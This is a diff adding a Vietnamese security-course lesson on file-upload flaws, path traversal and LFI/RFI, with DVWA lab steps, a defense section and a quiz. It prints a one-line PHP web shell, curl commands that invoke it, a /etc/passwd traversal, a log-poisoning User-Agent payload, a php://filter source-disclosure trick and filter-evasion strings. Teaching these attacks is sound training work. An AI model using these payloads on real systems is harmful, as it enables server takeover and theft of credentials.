@@ -1,0 +1,258 @@
+---
+title: "Web nâng cao: tải file, path traversal, LFI/RFI"
+code: "2.8"
+level: 2
+summary: "Bốn lỗ hổng web nối tiếp bài 2.3, nhưng đi xa hơn: thay vì chỉ đổi nghĩa một câu lệnh, chúng cho bạn chạy mã thẳng trên máy chủ hoặc đọc file hệ thống, qua việc tải file độc hại, đi ngược thư mục, hay nhúng nhầm file."
+duration: "80 phút"
+updated: "2026-11-09"
+prereq: ["2.3", "2.7"]
+objectives:
+  - "Giải thích được cơ chế lỗ hổng tải file, và vì sao kiểm tra phía client (JavaScript) không bao giờ là đủ"
+  - "Nhận ra path traversal và dùng nó để đọc một file ngoài thư mục web dự kiến"
+  - "Phân biệt được LFI và RFI, và nói được đường từ LFI tới thực thi mã đi qua đâu"
+  - "Đề xuất được cách phòng thủ gốc cho từng dạng, thay vì chỉ vá từng biểu hiện"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Một toà nhà có quầy lễ tân nhận bưu kiện. Nếu lễ tân nhận mọi gói hàng mà không kiểm tra bên trong, ai đó có thể gửi một "gói hàng" thực chất là người trốn trong thùng, rồi tự bước ra ngay trong sảnh. Lỗ hổng tải file đúng như vậy: máy chủ nhận file người dùng gửi lên mà không kiểm tra kỹ, và một trong số đó là mã chạy được.
+
+Bài này nối tiếp bài 2.3 với bốn lỗ hổng web nữa, đều có chung một gốc quen thuộc: **tin dữ liệu người dùng quá mức**. Khác biệt là ở bài 2.3 dữ liệu người dùng đổi nghĩa một câu lệnh có sẵn; ở đây nó quyết định luôn file nào được mở, được ghi, hay được chạy.
+
+Hậu quả vì thế thường nặng hơn: không chỉ đọc được dữ liệu mà có thể chạy được lệnh trên chính máy chủ.
+
+## Kiến thức chính
+
+### Lỗ hổng tải file (file upload)
+
+Nhiều website cho tải ảnh đại diện, hồ sơ, đính kèm. Chức năng này nghe vô hại, nhưng nếu máy chủ không kiểm tra đúng loại file, kẻ tấn công tải lên một **web shell**: một file mã (ví dụ PHP) mà mỗi khi được mở bằng trình duyệt thì chạy lệnh bất kỳ ngay trên máy chủ.
+
+Đây là một trong những cách nhanh nhất để đi từ "tìm thấy một ô tải file" tới "có shell trên máy chủ".
+
+Các kiểu kiểm tra yếu và vì sao chúng thất bại:
+
+- **Chỉ kiểm tra phía client** (bằng JavaScript chạy trong trình duyệt): vô dụng, vì kẻ tấn công gửi thẳng request bằng Burp Suite (bài 2.3) mà không qua trình duyệt.
+- **Chỉ kiểm tra đuôi file**: dễ lách bằng đuôi khác (`.php5`, `.phtml`) hoặc đuôi kép tuỳ cấu hình máy chủ.
+- **Chỉ kiểm tra `Content-Type`** (dòng khai báo loại file, ví dụ "đây là ảnh"): dòng này do phía người gửi tự khai nên giả được dễ dàng.
+
+Một web shell PHP tối giản chỉ để minh hoạ cơ chế, một dòng nhận tham số trên URL rồi chạy nó như lệnh hệ thống:
+
+```php
+<?php system($_GET['c']); ?>
+```
+
+Giả sử bạn đã lách qua được kiểm tra yếu ở trên và tải thành công file này lên với tên `avatar.php`. Bước tiếp theo là gọi tới nó để xác nhận nó thật sự chạy lệnh, không chỉ nằm đó như một file ảnh vô hại:
+
+<Lenh noi="Terminal trên máy Kali, sau khi đã tải thành công file avatar.php lên máy mục tiêu" muc="Gọi tới web shell vừa tải lên để chạy thử một lệnh hệ thống (id)">
+
+<Terminal title="Sau khi tải lên thư mục web, gọi tới nó">
+
+```text
+kali@lab:~$ curl "http://target/uploads/avatar.php?c=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `curl "http://target/uploads/avatar.php?c=id"`: gọi tới file `avatar.php` vừa tải lên, kèm tham số `c=id`. Đoạn PHP `system($_GET['c'])` ở trên sẽ lấy giá trị của `c` (ở đây là chữ `id`) và chạy nó như một lệnh hệ thống.
+- Đặt URL trong dấu nháy kép vì có dấu `?` và `=`, tránh shell hiểu nhầm.
+
+</div>
+
+<div slot="doc">
+
+- `uid=33(www-data) ...`: kết quả của lệnh `id` chạy trên **máy chủ**, không phải máy Kali. Thấy dòng này nghĩa là đã chạy được lệnh tuỳ ý trên máy mục tiêu — xác nhận web shell hoạt động.
+- Đổi `c=id` thành bất kỳ lệnh nào khác để thử, ví dụ `c=whoami` hoặc một lệnh reverse shell.
+- Trang trả về lỗi 404 hoặc không chạy lệnh: kiểm tra lại đường dẫn tải lên đúng chưa, và thư mục đó có cho phép PHP chạy không.
+
+</div>
+
+</Lenh>
+
+Từ đây, gọi `id` qua tham số `c` chỉ là bước xác nhận. Việc thật sự làm tiếp là đổi `c=id` thành một lệnh gọi về máy Kali, để có một reverse shell (bài 2.7) ổn định hơn là gọi từng lệnh qua URL.
+
+### Path traversal (đi ngược thư mục)
+
+Lỗ hổng tiếp theo nhẹ hơn một chút: không cho chạy lệnh, chỉ cho **đọc** file ngoài phạm vi dự kiến. Hãy tưởng tượng một trang xem ảnh, có chức năng lấy tên file từ tham số trên URL rồi mở đúng file đó trong thư mục ảnh.
+
+Nếu trang không kiểm tra, bạn chèn `../` (mỗi cụm lùi ra một cấp thư mục) để trèo dần ra khỏi thư mục ảnh và chạm tới bất kỳ file nào máy chủ đọc được.
+
+Trang dự kiến chỉ đọc ảnh trong `/var/www/images/`, nhưng dữ liệu người dùng đi thẳng vào đường dẫn:
+
+<Lenh noi="Terminal trên máy Kali" muc="Lợi dụng tham số 'file' của trang không làm sạch đầu vào, để đọc một file nằm ngoài thư mục ảnh dự kiến">
+
+<Terminal title="Đọc file ngoài thư mục web">
+
+```text
+kali@lab:~$ curl "http://target/view?file=../../../../etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `curl "http://target/view?file=../../../../etc/passwd"`: gọi trang `/view` với tham số `file`. Trang này vốn ghép tham số vào đường dẫn như `/var/www/images/<file>` để mở ảnh.
+- `../../../../`: mỗi `../` lùi ra một cấp thư mục. Lặp đủ số lần sẽ ra tới gốc hệ thống (`/`), rồi `etc/passwd` đi tiếp vào đúng file đó.
+
+</div>
+
+<div slot="doc">
+
+- Nội dung in ra chính là file `/etc/passwd` của máy chủ: mỗi dòng một tài khoản, dạng `tên:x:uid:gid:...`. Thấy được nội dung file hệ thống (thay vì một tấm ảnh) xác nhận lỗ hổng.
+- Không chắc cần lùi mấy cấp: thử thêm hoặc bớt `../`, hoặc dùng công cụ tự dò (ví dụ `ffuf` với wordlist path traversal).
+- Trang trả lỗi hoặc ảnh trống: trang có thể đã lọc chuỗi `../`, thử các biến thể mã hoá (`%2e%2e%2f`) — nằm ngoài phạm vi bài này.
+
+</div>
+
+</Lenh>
+
+Trên Windows, mục tiêu tương đương là các file cấu hình hoặc `boot.ini`.
+
+### LFI và RFI
+
+Path traversal chỉ cho đọc. Nhưng nếu trang không chỉ mở file để hiển thị, mà **nhúng và chạy** nó như một phần của trang (giống như chèn một đoạn mã PHP khác vào giữa trang hiện tại), thì cùng một lỗ hổng gốc leo lên thành chạy mã. Đây là hai dạng mạnh hơn của cùng ý tưởng:
+
+**LFI (Local File Inclusion):** website *nhúng và xử lý* một file dựa trên tham số người dùng, và kẻ tấn công ép nó nhúng một file khác trên *chính máy chủ*. Khác path traversal ở chỗ file được *thực thi hoặc diễn giải*, không chỉ đọc ra.
+
+Đường từ LFI tới thực thi mã thường qua việc nhúng một file mà kẻ tấn công kiểm soát được nội dung, ví dụ file log mà họ đã chèn được mã độc vào (bằng cách gửi mã đó trong một yêu cầu bình thường, biết rằng máy chủ sẽ ghi lại y nguyên vào log), rồi nhúng chính log đó.
+
+**RFI (Remote File Inclusion):** nguy hiểm hơn, vì website nhúng một file từ *máy chủ từ xa* do kẻ tấn công dựng, tức là chạy thẳng mã của họ mà không cần tìm cách "cấy" nó vào máy mục tiêu trước. Chỉ xảy ra khi cấu hình cho phép nhúng URL ngoài (`allow_url_include` trên PHP), nay thường bị tắt mặc định, nhưng vẫn gặp trên hệ thống cũ.
+
+Đường kinh điển từ LFI tới chạy mã là tìm một file mà kẻ tấn công *vừa kiểm soát được nội dung, vừa nhúng được*: file log của máy chủ web (chèn mã vào một trường rồi nhúng log), hoặc các "bộ bọc" đặc biệt của PHP (`php://`, `data://`) biến một chuỗi thành mã.
+
+Ở mức bài này chỉ cần nắm nguyên lý: LFI thành chạy mã khi có một nguồn mà đầu vào người dùng chạm tới được.
+
+<ConceptMap
+  client:visible
+  title="Bốn lỗ hổng, cùng một gốc: tin dữ liệu người dùng"
+  width={660}
+  height={340}
+  nodes={[
+    { id: 'in', label: 'Dữ liệu người dùng', sub: 'tên file, nội dung tải lên', x: 120, y: 180, w: 180, tone: 'warn', detail: 'Tham số đường dẫn, file tải lên, URL. Gốc chung của cả bốn lỗ hổng: dữ liệu này được tin và xử lý như đường dẫn hoặc mã.' },
+    { id: 'up', label: 'Tải file', sub: '→ web shell → thực thi mã', x: 400, y: 60, w: 200, tone: 'accent', detail: 'File chạy được được tải lên rồi gọi tới. Hậu quả nặng nhất: thực thi mã trên máy chủ.' },
+    { id: 'pt', label: 'Path traversal', sub: '→ đọc file hệ thống', x: 400, y: 140, w: 200, detail: 'Chèn ../ để đọc file ngoài thư mục dự kiến, ví dụ /etc/passwd.' },
+    { id: 'lfi', label: 'LFI', sub: '→ nhúng file nội bộ, có thể thành mã', x: 400, y: 220, w: 200, tone: 'accent', detail: 'Nhúng và diễn giải một file trên chính máy chủ; qua một số bước có thể dẫn tới thực thi mã.' },
+    { id: 'rfi', label: 'RFI', sub: '→ nhúng file từ máy kẻ tấn công', x: 400, y: 300, w: 200, tone: 'accent', detail: 'Nhúng file từ máy chủ từ xa do kẻ tấn công kiểm soát. Thực thi mã trực tiếp, nhưng nay thường bị tắt mặc định.' },
+  ]}
+  edges={[
+    { from: 'in', to: 'up' },
+    { from: 'in', to: 'pt' },
+    { from: 'in', to: 'lfi' },
+    { from: 'in', to: 'rfi' },
+  ]}
+/>
+
+### Từ LFI tới chạy mã: đầu độc log
+
+Phần trên nói nguyên lý; đây là đường cụ thể hay dùng nhất trong lab. Ý tưởng gồm hai bước: trước hết **ép máy chủ ghi mã PHP của bạn vào một file nó kiểm soát** (file log truy cập), sau đó **dùng LFI nhúng chính file log đó** để PHP trong đó được chạy.
+
+<Lenh noi="Terminal trên máy Kali, đã xác nhận một tham số bị LFI (nhúng được /etc/passwd)" muc="Chèn mã PHP vào User-Agent để máy chủ ghi nó vào log, rồi nhúng log qua LFI để mã chạy" quyen="Cần một điểm LFI đã xác nhận và đọc được file log của web server">
+
+<Terminal title="Đầu độc log rồi nhúng để chạy lệnh">
+
+```text
+kali@lab:~$ curl http://target/index.php -A "<?php system(\$_GET['c']); ?>"
+
+kali@lab:~$ curl "http://target/index.php?page=../../../../var/log/apache2/access.log&c=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `curl ... -A "<?php system(\$_GET['c']); ?>"`: `-A` đặt header `User-Agent`. Apache ghi nguyên User-Agent vào `access.log`, nên mã PHP này giờ **nằm trong file log** của máy chủ. (`\$` để shell không nuốt mất dấu `$`.)
+- Lệnh thứ hai dùng LFI nhúng chính file log đó. Khi PHP diễn giải file log, nó gặp đoạn `<?php ... ?>` vừa chèn và chạy — tham số `c=id` được truyền vào `system()`.
+
+</div>
+
+<div slot="doc">
+
+- `uid=33(www-data)` là kết quả `id` chạy trên máy chủ: log đã bị diễn giải như mã, xác nhận LFI đã thành chạy mã. Đổi `c=id` thành lệnh reverse shell (bài 2.7) để có shell ổn định.
+- Đường log hay gặp: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`. Trên máy đọc không được log, hướng thay thế là bộ bọc PHP bên dưới.
+
+</div>
+
+</Lenh>
+
+<Callout type="note" label="php://filter: đọc mã nguồn khi chưa chạy được mã">
+Khi chưa đầu độc được log, bộ bọc <code>php://filter</code> vẫn giúp **đọc mã nguồn PHP** (thường bị máy chủ chạy mất nên không thấy): <code>?page=php://filter/convert.base64-encode/resource=config.php</code> trả về `config.php` đã mã hoá base64 — giải ra hay lộ mật khẩu cơ sở dữ liệu hoặc khoá. Đọc được mã nguồn rồi mới tìm ra đường chạy mã thường dễ hơn.
+</Callout>
+
+Công cụ dò thư mục ở bài 2.2 (gobuster, ffuf) giúp tìm điểm tải file và tham số đáng ngờ; Burp Suite (bài 2.3) giúp sửa request tay trước khi gửi, đổi tên file hoặc header `Content-Type` để qua mặt kiểm tra phía client.
+
+<LabBrief
+  ten="Đọc một file hệ thống qua path traversal"
+  muctieu="Tự tìm một tham số nhận tên file trên DVWA và dùng nó để đọc một file bạn không được phép xem trực tiếp"
+  may="DVWA mức Low (bài 0.2)"
+  ip="http://10.10.14.20/dvwa/"
+  thoigian="30 phút"
+  xong="Bạn đọc được nội dung /etc/passwd qua trình duyệt từ trang File Inclusion của DVWA, và giải thích được bằng lời vì sao dấu ../ làm được điều đó"
+>
+
+1. Vào trang File Inclusion, quan sát tham số trên URL khi bấm vào một liên kết file có sẵn.
+2. Sửa tham số đó để trỏ ra ngoài thư mục web, dùng `../` để lùi dần lên thư mục gốc.
+3. Đọc được `/etc/passwd`, ghi lại payload chính xác đã dùng.
+4. Thử đổi mức bảo mật DVWA lên Medium, xem payload cũ còn dùng được không và vì sao.
+
+<div slot="goiy1">
+Phần "Kiến thức chính" ở trên đã giải thích LFI bằng đúng ví dụ `?page=../../../../etc/passwd`; thử trước với số lượng `../` khác nhau vì độ sâu thư mục mỗi cài đặt có thể khác.
+</div>
+
+<div slot="goiy2">
+Nếu mức Medium chặn chuỗi `../`, thử các cách viết khác đã học: mã hoá URL (`%2e%2e%2f`), hoặc lặp `....//` để bộ lọc chỉ xoá một lớp `../` vẫn còn sót lại dấu vết hợp lệ.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: trang hiện nguyên văn nội dung `/etc/passwd`, mỗi dòng là một tài khoản hệ thống.
+- Trang hiện lỗi `failed to open stream`: số lượng `../` chưa đủ để lùi tới gốc, thêm từng cặp một và thử lại.
+- Ở mức Medium không đọc được nữa: đó là vì bộ lọc đã thay chuỗi `../` thành rỗng — đọc lại phần mô tả cách né bộ lọc yếu trong Kiến thức chính.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Nếu bạn là lập trình viên hay người duyệt mã, hãy nhớ mỗi dạng có một cách chặn gốc riêng, nhưng cùng chung một tinh thần: đừng tin bất kỳ phần nào của dữ liệu người dùng là an toàn để dùng làm đường dẫn hay mã. <strong>Tải file:</strong> kiểm tra ở máy chủ, không tin client. Dùng danh sách cho phép (allowlist) đuôi và loại file thật sự đọc được từ nội dung file, đổi tên file ngẫu nhiên, lưu file ngoài thư mục web và phục vụ qua một lớp trung gian, và không bao giờ cho thư mục chứa file tải lên có quyền thực thi mã. <strong>Path traversal:</strong> không ghép đường dẫn từ dữ liệu người dùng; dùng mã định danh (ID) ánh xạ tới file ở phía máy chủ, hoặc chuẩn hoá và kiểm tra đường dẫn luôn nằm trong thư mục cho phép. <strong>LFI/RFI:</strong> không nhúng file theo tham số người dùng; tắt khả năng nhúng URL từ xa; dùng allowlist các trang được phép nhúng. Và dù lỡ có một trong bốn lỗi này, hãy chạy dịch vụ web với quyền tối thiểu, để một web shell lọt vào cũng chỉ làm được rất ít (nối tiếp bài 3.1, 3.2).
+<br /><strong>Phát hiện:</strong> chuỗi `../`, `/etc/passwd`, `php://`, hay tên file hệ thống trong tham số URL để lại dấu rõ trong log truy cập. Một request POST tải lên file đuôi lạ rồi ngay sau đó một request GET tới chính file đó là mẫu kinh điển của việc tải và gọi web shell. Luật WAF và giám sát log web (bài 8.1) bắt được các mẫu này.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Tin rằng kiểm tra đuôi file hoặc kiểm tra phía client là đủ.** Cả hai đều lách được trong vài giây bằng Burp, nên nếu bạn đang đánh giá một website, đừng dừng lại chỉ vì thấy có kiểm tra đuôi file ở giao diện.
+- **Nhầm path traversal với LFI.** Path traversal chỉ đọc nội dung; LFI nhúng và chạy nó. Nhầm hai thứ này khiến bạn đánh giá sai mức độ nghiêm trọng khi viết báo cáo, một bên là lộ thông tin, một bên có thể là chiếm cả máy chủ.
+- **Thử RFI trước, thất bại vì nay thường bị tắt, rồi bỏ qua LFI.** RFI nghe "ngầu" hơn, nhưng LFI vẫn là dạng hay gặp hơn nhiều trong thực tế. Đừng bỏ công tìm RFI trước khi thử hết các hướng của LFI.
+- **Quên rằng quyền của dịch vụ web quyết định web shell làm được gì.** Có web shell chạy lệnh rồi, nhiều người mới nghĩ là đã "xong", nhưng lệnh đó vẫn chỉ chạy bằng quyền `www-data`. Bước tiếp theo luôn là leo thang (bài 3.1).
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Vì sao kiểm tra file tải lên ở phía client (JavaScript) là không đủ?', options: ['Vì JavaScript chậm', 'Vì kẻ tấn công gửi thẳng request qua công cụ như Burp, bỏ qua trình duyệt', 'Vì client luôn đúng'], answer: 1, explain: 'Mọi kiểm tra phía client đều bỏ qua được; kiểm tra phải nằm ở máy chủ.' },
+    { q: 'Chuỗi ../ trong path traversal dùng để làm gì?', options: ['Tăng tốc tải trang', 'Trèo ngược ra khỏi thư mục dự kiến để đọc file hệ thống', 'Mã hoá URL'], answer: 1, explain: 'Mỗi ../ lùi một cấp thư mục, đủ số lần là ra tới gốc rồi đọc file như /etc/passwd.' },
+    { q: 'Khác biệt chính giữa path traversal và LFI là gì?', options: ['Không có khác biệt', 'Path traversal đọc nội dung file; LFI nhúng và diễn giải file, nên có thể dẫn tới thực thi mã', 'LFI chỉ chạy trên Windows'], answer: 1, explain: 'LFI khiến file được xử lý/thực thi chứ không chỉ đọc ra, nên nguy hiểm hơn.' },
+    { q: 'Cách chặn gốc lỗ hổng tải web shell?', options: ['Ẩn nút tải lên', 'Kiểm tra phía máy chủ bằng allowlist, lưu ngoài thư mục web, và không cho thư mục tải lên thực thi mã', 'Đổi tên website'], answer: 1, explain: 'Chặn tận gốc nằm ở kiểm tra phía máy chủ và không cho nơi chứa file tải lên chạy mã.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Tải file cho chạy mã trực tiếp qua web shell; đừng tin kiểm tra phía client, kiểm tra luôn phải ở máy chủ.
+- Path traversal chỉ đọc file ngoài thư mục bằng `../`; LFI đi xa hơn, nhúng và diễn giải file, có thể thành thực thi mã.
+- RFI nhúng file từ máy kẻ tấn công dựng sẵn; mạnh hơn LFI nhưng nay thường bị tắt mặc định, nên LFI hay gặp hơn.
+- Cả bốn lỗi chung một gốc: tin dữ liệu người dùng dùng làm đường dẫn hoặc mã. Phòng thủ gốc là không ghép đường dẫn và không nhúng theo tham số người dùng, cộng với chạy dịch vụ web ở quyền tối thiểu.
